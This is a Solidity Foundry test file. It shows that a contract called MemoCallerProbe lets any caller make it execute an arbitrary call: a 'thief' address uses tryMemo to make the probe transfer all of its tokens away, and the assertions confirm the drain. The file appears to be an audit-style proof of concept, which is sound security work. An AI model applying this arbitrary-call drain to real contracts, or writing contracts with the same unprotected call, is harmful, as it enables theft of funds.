// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {MemoCallerProbe} from "./MemoCallerProbe.sol";

contract FakeToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
}

contract ProbeRiskTest is Test {
    function test_anyoneCanDrainTheProbe() public {
        MemoCallerProbe probe = new MemoCallerProbe();
        FakeToken token = new FakeToken();
        token.mint(address(probe), 10_000);

        address thief = address(0xBAD);
        vm.prank(thief);
        probe.tryMemo(
            address(token),
            abi.encodeWithSignature("transfer(address,uint256)", thief, uint256(10_000))
        );

        assertEq(token.balanceOf(address(probe)), 0, "probe drained");
        assertEq(token.balanceOf(thief), 10_000, "thief took it, with no access control");
    }
}
